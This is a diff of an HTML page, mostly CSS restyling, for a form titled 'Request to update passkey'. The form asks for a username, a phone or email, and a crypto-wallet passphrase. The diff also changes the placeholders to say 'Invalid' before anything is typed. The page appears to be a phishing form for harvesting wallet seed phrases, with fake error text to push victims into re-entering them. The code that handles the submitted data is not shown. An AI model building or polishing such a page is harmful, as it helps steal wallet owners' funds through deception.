@@ -33,17 +33,21 @@
             border-radius: 10px;
             box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
         }
-        textarea, .btn {
+        /* Common styling for inputs to match <p class="info"> */
+        textarea {
             width: calc(100% - 20px);
             padding: 10px;
-            font-size: 16px;
+            font-size: 14px; /* Same as info text */
             border: 1px solid #ccc;
             border-radius: 5px;
-            color: gray;
             resize: none;
+            color: gray; /* Same as info text */
+            font-family: Arial, sans-serif;
         }
         textarea::placeholder {
-            color: gray;
+            font-size: 14px; /* Match info text */
+            color: gray; /* Match info text */
+            font-family: Arial, sans-serif;
         }
         /* Username and Email height same as button */
         .input-small {
@@ -54,12 +58,15 @@
             height: 150px;
         }
         .btn {
+            width: 100%;
             height: 50px;
             background-color: #6A329F;
             color: white;
             border: none;
             cursor: pointer;
             font-weight: bold;
+            font-size: 16px;
+            border-radius: 5px;
         }
         .btn-disabled {
             background-color: #ccc;
@@ -68,11 +75,13 @@
         .info {
             font-size: 14px;
             color: gray;
+            font-family: Arial, sans-serif;
             margin-top: 20px;
         }
         .error-message {
-            color: red;
             font-size: 14px;
+            color: red;
+            font-family: Arial, sans-serif;
             margin-bottom: 10px;
         }
         @media (max-width: 600px) {
@@ -87,7 +96,7 @@
                 padding: 15px;
             }
             textarea {
-                font-size: 14px;
+                font-size: 12px;
                 padding: 8px;
             }
             .btn {
@@ -121,9 +130,9 @@
     </div>
     <div class="container">
         <h2>Request to update passkey</h2>
-        <textarea class="input-small" placeholder="Enter Username"></textarea>
-        <textarea class="input-small" placeholder="Enter Phone number/Email ID"></textarea>
-        <textarea id="passphrase" class="input-large" placeholder="Enter Passphrase"></textarea>
+        <textarea class="input-small" placeholder="Invalid Username"></textarea>
+        <textarea class="input-small" placeholder="Invalid Phone number/Email ID"></textarea>
+        <textarea id="passphrase" class="input-large" placeholder="Invalid Passphrase"></textarea>
         <p id="message" class="error-message"></p>
         <button class="btn" onclick="validatePassphrase()">Send Request</button>
         <p class="info">As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
